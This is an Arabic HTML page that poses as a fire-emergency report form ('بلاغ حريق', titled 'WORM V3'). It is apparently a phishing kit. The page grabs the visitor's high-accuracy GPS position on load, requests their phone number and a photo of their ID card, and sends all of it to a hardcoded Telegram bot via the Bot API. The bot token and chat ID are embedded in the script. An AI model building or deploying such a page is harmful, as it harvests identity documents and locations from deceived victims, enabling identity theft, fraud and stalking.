<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بلاغ حريق - WORM V3</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #0d0d0d;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 20px;
            max-width: 450px;
            width: 100%;
            border: 2px solid #ff2222;
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
        }
        h1 { color: #ff3333; text-align: center; }
        label { display: block; margin: 15px 0 5px; font-weight: bold; }
        input, button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input {
            background: #2a2a2a;
            color: #fff;
            border: 1px solid #444;
        }
        input:focus { outline: 2px solid #ff4444; }
        button {
            background: #ff4444;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.3s;
        }
        button:hover { background: #cc0000; transform: scale(1.02); }
        #status {
            margin-top: 15px;
            padding: 10px;
            background: #111;
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            color: #ffaa00;
        }
        .gps-box {
            background: #1a2a1a;
            padding: 12px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
            border: 1px solid #33aa33;
            font-size: 14px;
        }
        .gps-box span { color: #7fff7f; font-weight: bold; }
        .btn-gps {
            background: #2a6b2a;
            margin-top: 5px;
            padding: 8px;
            font-size: 14px;
        }
        .btn-gps:hover { background: #1f8b1f; }
        .gps-link {
            display: inline-block;
            margin-top: 8px;
            padding: 8px 15px;
            background: #1a4a8a;
            border-radius: 8px;
            color: #7fcfff;
            text-decoration: none;
            font-weight: bold;
            border: 1px solid #3a8aff;
        }
        .gps-link:hover { background: #2a6aba; }
    </style>
</head>
<body>

<div class="container">
    <h1>🚨 بلاغ حريق</h1>

    <label>📞 رقم الهاتف</label>
    <input type="text" id="phone" placeholder="مثال: 0952725590" value="0952725590">

    <label>🪪 صورة الهوية</label>
    <input type="file" id="idImage" accept="image/*">

    <div class="gps-box">
        <div>📍 الموقع (GPS):</div>
        <div id="gpsDisplay"><span>⏳ جاري الجلب...</span></div>
        <div id="gpsLinkContainer" style="margin-top:8px;"></div>
        <button class="btn-gps" id="refreshGpsBtn">🔄 إعادة محاولة الموقع</button>
    </div>

    <button id="sendBtn">🔥 إرسال البلاغ</button>
    <div id="status">⏳ في انتظار الإرسال</div>
</div>

<script>
    const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
    const CHAT_ID = "8665747715";

    let userLat = "غير متاح";
    let userLon = "غير متاح";

    // ======== دالة تحديث رابط خرائط جوجل ========
    function updateGoogleMapsLink(lat, lon) {
        const container = document.getElementById('gpsLinkContainer');
        if (lat !== "غير متاح" && lon !== "غير متاح") {
            const url = `https://www.google.com/maps?q=${lat},${lon}`;
            container.innerHTML = `<a href="${url}" target="_blank" class="gps-link">🗺️ فتح في خرائط جوجل</a>`;
        } else {
            container.innerHTML = '';
        }
    }

    // ======== دالة جلب الموقع ========
    function getGPS() {
        const gpsDisplay = document.getElementById('gpsDisplay');
        gpsDisplay.innerHTML = `<span>⏳ جاري جلب الموقع...</span>`;

        if (!navigator.geolocation) {
            gpsDisplay.innerHTML = `<span style="color:#ff6666;">❌ المتصفح لا يدعم GPS</span>`;
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                userLat = pos.coords.latitude;
                userLon = pos.coords.longitude;
                gpsDisplay.innerHTML = `<span style="color:#7fff7f;">✅ ${userLat}, ${userLon}</span>`;
                updateGoogleMapsLink(userLat, userLon);
                document.getElementById('status').innerHTML = '✅ GPS جاهز';
                document.getElementById('status').style.color = '#7fff7f';
            },
            (err) => {
                let msg = '';
                switch (err.code) {
                    case 1: msg = '🚫 المستخدم رفض الإذن (افتح الإعدادات واسمح)'; break;
                    case 2: msg = '📡 الموقع غير متاح حالياً'; break;
                    case 3: msg = '⏱️ انتهت مهلة المحاولة'; break;
                    default: msg = '⚠️ خطأ غير معروف: ' + err.message;
                }
                gpsDisplay.innerHTML = `<span style="color:#ff6666;">${msg}</span>`;
                document.getElementById('status').innerHTML = '⚠️ ' + msg;
                document.getElementById('status').style.color = '#ffaa00';
                updateGoogleMapsLink("غير متاح", "غير متاح");
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    // جلب الموقع فور تحميل الصفحة
    getGPS();

    // زر إعادة المحاولة
    document.getElementById('refreshGpsBtn').addEventListener('click', function() {
        getGPS();
    });

    // ======== إرسال البيانات إلى تليجرام ========
    async function sendToTelegram(phone, imageFile, lat, lon) {
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = '⏳ جاري الإرسال...';
        statusDiv.style.color = '#ffaa00';

        // بناء رابط خرائط جوجل
        let mapsLink = "غير متاح";
        if (lat !== "غير متاح" && lon !== "غير متاح") {
            mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        }

        try {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', imageFile);
            formData.append('caption', 
                `🔥 بلاغ حريق\n📞 الهاتف: ${phone}\n📍 الموقع (رابط): ${mapsLink}`
            );

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });

            const data = await response.json();
            if (data.ok) {
                statusDiv.innerHTML = '✅ تم الإرسال بنجاح إلى تليجرام!';
                statusDiv.style.color = '#7fff7f';
            } else {
                statusDiv.innerHTML = '❌ فشل الإرسال: ' + data.description;
                statusDiv.style.color = '#ff6666';
            }
        } catch (error) {
            statusDiv.innerHTML = '🚫 خطأ في الشبكة: ' + error.message;
            statusDiv.style.color = '#ff6666';
        }
    }

    // ======== زر الإرسال الرئيسي ========
    document.getElementById('sendBtn').addEventListener('click', function () {
        const phone = document.getElementById('phone').value.trim();
        const fileInput = document.getElementById('idImage');
        const file = fileInput.files[0];

        if (!phone) {
            document.getElementById('status').innerHTML = '⚠️ أدخل رقم الهاتف';
            document.getElementById('status').style.color = '#ffaa00';
            return;
        }
        if (!file) {
            document.getElementById('status').innerHTML = '⚠️ اختر صورة الهوية';
            document.getElementById('status').style.color = '#ffaa00';
            return;
        }

        // إذا الموقع غير متاح، نطلب مرة أخرى قبل الإرسال
        if (userLat === "غير متاح" || userLon === "غير متاح") {
            document.getElementById('status').innerHTML = '⏳ جاري جلب الموقع... حاول مرة أخرى خلال 3 ثوان';
            document.getElementById('status').style.color = '#ffaa00';
            getGPS();
            setTimeout(() => {
                sendToTelegram(phone, file, userLat, userLon);
            }, 3000);
        } else {
            sendToTelegram(phone, file, userLat, userLon);
        }
    });

    // تحديث الحالة عند تغيير المدخلات
    document.getElementById('phone').addEventListener('input', () => {
        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
        document.getElementById('status').style.color = '#ffaa00';
    });
    document.getElementById('idImage').addEventListener('change', () => {
        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
        document.getElementById('status').style.color = '#ffaa00';
    });
</script>

</body>
</html>
